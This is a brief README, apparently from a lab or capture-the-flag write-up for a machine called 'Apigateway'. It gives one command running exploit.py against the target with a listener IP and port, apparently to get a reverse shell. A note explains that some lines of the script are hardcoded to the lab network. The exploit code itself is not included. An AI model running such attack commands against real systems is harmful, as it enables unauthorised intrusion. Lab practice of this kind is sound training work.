# Apigateway

You can just run the exploit
```bash
python3 exploit.py -t https://apigateway:8000 -l 192.168.45.243 -p 4444
```
![Apigateway](/.images/apigateway.png)

> [!NOTE]
> Lines `#238`, `#239` and `#267` are fixed to the known vulnerable network, host and port. **In a real world scenario, you should look all the possible networks, hosts and ports.**